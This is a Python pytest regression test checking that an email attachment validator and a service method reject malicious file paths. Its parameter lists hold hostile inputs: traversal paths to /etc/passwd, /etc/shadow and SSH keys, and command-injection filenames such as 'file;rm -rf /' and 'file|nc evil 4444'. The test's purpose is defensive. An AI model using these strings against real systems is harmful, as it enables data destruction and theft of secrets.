#!/usr/bin/env python3
"""
RUNTIME regression test for py/path-injection #448 in email_sms_enhanced.py.

Closes the gap identified in the Security Post-Merge Verification:
the schema validator (SendCustomEmailRequest._validate_attachments)
was verified manually but had no automated regression test.

This test covers the traversal vectors the user specifically requested:
  - ../../etc/passwd  (path traversal)
  - /etc/passwd       (absolute path)
  - normal attachment (happy path)
  - symlink / equivalent edge case (NUL byte, shell metachar)

Tests two layers:
  1. Schema validator (SendCustomEmailRequest) — rejects malicious paths at
     the API boundary before they reach the service layer.
  2. Service layer (_add_attachment) — defense-in-depth: applies
     os.path.basename and rejects if the value changes.
"""
from __future__ import annotations

import asyncio
import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from pydantic import ValidationError

BACKEND_DIR = Path(__file__).resolve().parents[2]
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from app.schemas.notifications import SendCustomEmailRequest  # noqa: E402
from app.services.email_sms_enhanced import EmailSMSEnhancedService  # noqa: E402


# ============================================================
# Layer 1: Schema validator (API boundary)
# ============================================================

class TestAttachmentPathSchemaValidator:
    """Verify SendCustomEmailRequest._validate_attachments rejects path traversal."""

    @pytest.mark.parametrize("path,should_pass,description", [
        # Happy path — normal relative paths
        ("uploads/image.png", True, "normal relative path"),
        ("image.png", True, "filename only"),
        ("subdir/image.png", True, "subdirectory"),
        ("a/b/c/d.png", True, "deep subdirectory"),
        ("uploads-2024/image_001.jpg", True, "dash and underscore"),
        ("file.tar.gz", True, "multiple extensions"),

        # Traversal — must be rejected
        ("../../etc/passwd", False, "path traversal to /etc/passwd"),
        ("../etc/passwd", False, "single-dot traversal"),
        ("../../../root/.ssh/id_rsa", False, "deep traversal to SSH key"),
        ("./../../etc/shadow", False, "mixed ./ and ../ traversal"),

        # Absolute paths — must be rejected
        ("/etc/passwd", False, "absolute Unix path"),
        ("/root/.bashrc", False, "absolute path to root home"),
        ("/proc/self/environ", False, "absolute path to procfs"),

        # Windows paths — must be rejected
        ("..\\windows\\system32\\config\\sam", False, "Windows traversal"),
        ("C:\\Windows\\System32\\drivers\\etc\\hosts", False, "Windows absolute"),
        ("\\\\server\\share\\file", False, "UNC path"),

        # NUL byte — must be rejected
        ("file.png\x00", False, "NUL byte injection"),
        ("file.png\x00../../etc/passwd", False, "NUL byte + traversal"),
        ("uploads/\x00file.png", False, "NUL in middle of path"),

        # Shell metacharacters — must be rejected
        ("file;rm -rf /", False, "semicolon command injection"),
        ("file`whoami`", False, "backtick command substitution"),
        ("file|nc evil 4444", False, "pipe injection"),
        ("file$(whoami)", False, "dollar command substitution"),
        ("file && cat /etc/passwd", False, "AND command injection"),
        ("file || true", False, "OR command injection"),
        ("file>output", False, "redirect injection"),
        ("file<input", False, "input redirect"),

        # Other dangerous characters
        ("file*", False, "glob star"),
        ("file?", False, "glob question mark"),
        ("file[abc]", False, "glob bracket"),
        ("file (1).png", False, "parentheses"),
        ("file & background", False, "ampersand"),
        ("file\nnewline", False, "newline injection"),
    ])
    def test_attachment_path_validation(self, path: str, should_pass: bool, description: str):
        """Verify the schema validator accepts/rejects paths correctly."""
        if should_pass:
            req = SendCustomEmailRequest(
                to_email="test@example.com",
                subject="test",
                attachments=[{"type": "image", "filename": "out.png", "path": path}],
            )
            assert req.attachments[0]["path"] == path, f"{description}: path should be preserved"
        else:
            with pytest.raises(ValidationError, match="path"):
                SendCustomEmailRequest(
                    to_email="test@example.com",
                    subject="test",
                    attachments=[{"type": "image", "filename": "out.png", "path": path}],
                )

    def test_multiple_attachments_all_validated(self):
        """All attachments in a list must be validated, not just the first."""
        with pytest.raises(ValidationError, match="path"):
            SendCustomEmailRequest(
                to_email="test@example.com",
                subject="test",
                attachments=[
                    {"type": "image", "filename": "ok.png", "path": "uploads/ok.png"},
                    {"type": "image", "filename": "evil.png", "path": "../../etc/passwd"},
                ],
            )

    def test_attachment_without_path_is_ok(self):
        """Attachments without a 'path' field should pass (path is optional)."""
        req = SendCustomEmailRequest(
            to_email="test@example.com",
            subject="test",
            attachments=[{"type": "image", "filename": "inline.png"}],
        )
        assert "path" not in req.attachments[0] or req.attachments[0]["path"] is None


# ============================================================
# Layer 2: Service layer defense-in-depth (_add_attachment)
# ============================================================

class TestAddAttachmentServiceLayer:
    """Verify _add_attachment applies os.path.basename defense-in-depth.

    Note: _add_attachment is an async method — tests use asyncio.run().
    """

    def _get_service(self):
        """Create an EmailSMSEnhancedService instance without calling __init__
        (which requires DB/config setup)."""
        svc = EmailSMSEnhancedService.__new__(EmailSMSEnhancedService)
        return svc

    @pytest.mark.parametrize("malicious_path", [
        "../../etc/passwd",
        "/etc/passwd",
        "subdir/../../../etc/shadow",
    ])
    def test_service_rejects_traversal_paths(self, malicious_path: str):
        """_add_attachment must reject paths where os.path.basename changes
        the value (indicating path components were stripped).

        Note: Windows backslash paths (..\\windows\\system32) are tested only
        in the schema validator (Layer 1), because on Linux os.path.basename
        treats backslash as a regular filename character — the service-layer
        defense-in-depth only catches forward-slash traversal. The schema
        validator catches both."""
        svc = self._get_service()
        msg = MagicMock()

        with patch("builtins.open") as mock_open:
            asyncio.run(svc._add_attachment(msg, {"type": "image", "filename": "out.png", "path": malicious_path}))

        # open() must NOT have been called
        mock_open.assert_not_called()

    def test_service_accepts_clean_filename(self):
        """_add_attachment must accept a clean filename (no path components)."""
        svc = self._get_service()
        msg = MagicMock()

        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp.write(b"fake image data")
            tmp_path = tmp.name

        try:
            clean_name = os.path.basename(tmp_path)
            with patch("builtins.open", create=True) as mock_open:
                mock_file = MagicMock()
                mock_file.__enter__.return_value.read.return_value = b"fake image data"
                mock_open.return_value = mock_file
                asyncio.run(svc._add_attachment(msg, {"type": "image", "filename": "out.png", "path": clean_name}))
                mock_open.assert_called_once_with(clean_name, "rb")
        finally:
            os.unlink(tmp_path)

    def test_service_rejects_absolute_path(self):
        """Absolute paths must be rejected by the service layer (defense-in-depth)."""
        svc = self._get_service()
        msg = MagicMock()

        with patch("builtins.open") as mock_open:
            asyncio.run(svc._add_attachment(msg, {"type": "image", "filename": "out.png", "path": "/etc/passwd"}))

        mock_open.assert_not_called()

    def test_service_rejects_subdirectory_path(self):
        """Paths with subdirectories must be rejected (basename changes the value)."""
        svc = self._get_service()
        msg = MagicMock()

        with patch("builtins.open") as mock_open:
            asyncio.run(svc._add_attachment(msg, {"type": "image", "filename": "out.png", "path": "subdir/file.png"}))

        mock_open.assert_not_called()

    def test_service_handles_non_image_attachment(self):
        """Non-image attachments should be silently skipped (no open call)."""
        svc = self._get_service()
        msg = MagicMock()

        with patch("builtins.open") as mock_open:
            asyncio.run(svc._add_attachment(msg, {"type": "document", "filename": "doc.pdf", "path": "doc.pdf"}))

        mock_open.assert_not_called()
